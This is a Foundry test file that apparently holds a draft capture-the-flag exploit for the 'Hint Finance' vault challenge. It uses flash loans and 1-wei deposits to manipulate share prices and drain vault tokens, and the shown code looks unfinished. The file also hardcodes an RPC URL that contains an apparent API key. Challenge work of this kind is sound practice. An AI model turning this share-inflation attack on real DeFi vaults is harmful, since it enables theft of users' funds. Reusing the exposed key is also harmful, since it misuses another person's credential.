// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.6;

import "forge-std/Test.sol";
import "../hint-finance/public/contracts/Setup.sol";

contract Attack {
    ERC20Like token1;
    ERC20Like token2;
    ERC20Like token3;
    HintFinanceFactory factory;
    HintFinanceVault vault1;
    HintFinanceVault vault2;
    HintFinanceVault vault3;

    ERC20Like token4;
    ERC20Like token5;
    ERC20Like token6;

    constructor(address _setup) payable {
        Setup setup = Setup(_setup);
        token1 = ERC20Like(setup.underlyingTokens(0));
        token2 = ERC20Like(setup.underlyingTokens(1));
        token3 = ERC20Like(setup.underlyingTokens(2));
        factory = setup.hintFinanceFactory();
        vault1 = HintFinanceVault(factory.underlyingToVault(address(token1)));
        vault2 = HintFinanceVault(factory.underlyingToVault(address(token2)));
        vault3 = HintFinanceVault(factory.underlyingToVault(address(token3)));

        token4 = ERC20Like(setup.rewardTokens(0));
        token5 = ERC20Like(setup.rewardTokens(1));
        token6 = ERC20Like(setup.rewardTokens(2));
    }

    receive() external payable {}

    function attack() public {
        vault1.flashloan(
            address(token1),
            token1.balanceOf(address(vault1)),
            abi.encode(address(vault1), address(token1))
        );
    }

    function onHintFinanceFlashloan(
        address token,
        address factory,
        uint256 amount,
        bool isUnderlyingOrReward,
        bytes memory data
    ) external {
        (address _vault, address _underlying) = abi.decode(
            data,
            (address, address)
        );
        //we got all token from vault. so share price is zero.
        //deposit 1 wei
        HintFinanceVault vault = HintFinanceVault(_vault);
        ERC20Like underlying = ERC20Like(_underlying);
        underlying.approve(address(vault), 1e69);
        underlying.transfer(address(vault), 1 wei);
        vault.deposit(1 wei);// receive share == totalSupply
    }
}

contract HintFinanceVaultTest is Test {
    Setup setup;
    ERC20Like token1;
    ERC20Like token2;
    ERC20Like token3;
    HintFinanceFactory factory;
    HintFinanceVault vault1;
    HintFinanceVault vault2;
    HintFinanceVault vault3;
    Attack attacker;

    function setUp() public {
        uint mainnetFork = vm.createFork(
            "https://eth-mainnet.alchemyapi.io/v2/kIP2_euA9T6Z-e5MjHzTzRUmgqCLsHUA"
        );
        vm.selectFork(mainnetFork);
        vm.rollFork(18311140);

        setup = new Setup{value: 30 ether}();
        token1 = ERC20Like(setup.underlyingTokens(0));
        token2 = ERC20Like(setup.underlyingTokens(1));
        token3 = ERC20Like(setup.underlyingTokens(2));
        factory = setup.hintFinanceFactory();
        vault1 = HintFinanceVault(factory.underlyingToVault(address(token1)));
        vault2 = HintFinanceVault(factory.underlyingToVault(address(token2)));
        vault3 = HintFinanceVault(factory.underlyingToVault(address(token3)));

        Attack attacker = new Attack{value: 1 ether}(address(setup));
    }

    function testStealVault1() public {
        console.log("vault1 balance: %e", token1.balanceOf(address(vault1)));
        console.log(
            "vault1 totalSupply: %e",
            vault1.totalSupply()
        );
        // flashloan underlying token condition:
        // share supply no change
        // underlying token balance only increase or equal
        
        // first attacker must deposit to get some share.

        // share price can be inflated to infinity. so flashloan then inflate price. buy back with cheap price
        // attacker share portion now worth a lot more. sell it back to vault. profit.
        // make sure condition share supply is no change. What happen is attacker share worth just increase.

        
        
        UniswapV2RouterLike router = UniswapV2RouterLike(0xf164fC0Ec4E93095b804a4795bBe1e041497b92a);
        address[] memory path = new address[](2);
        path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        path[1] = address(token1);
        router.swapExactETHForTokens{value: 20 ether}(0, path, address(this), block.timestamp + 1 days);
        console.log("my balance: %e", token1.balanceOf(address(this)));
        token1.approve(address(vault1), type(uint256).max);

        vault1.deposit(token1.balanceOf(address(this)));
        console.log("my share: %e", vault1.balanceOf(address(this)));
        console.log(
            "vault1 totalSupply: %e",
            vault1.totalSupply()
        );
        
        vault1.flashloan(
            address(token1),
            token1.balanceOf(address(vault1)),
            ""
        );
        



        console.log("vault1 balance: %e", token1.balanceOf(address(vault1)));
    }

    function onHintFinanceFlashloan(
        address token,
        address factory,
        uint256 amount,
        bool isUnderlyingOrReward,
        bytes memory data
    ) external {
        //after flash loan we got all token.share price drop low

        //refunding
        ERC20Like(token).transfer(address(msg.sender), amount);
    }
}
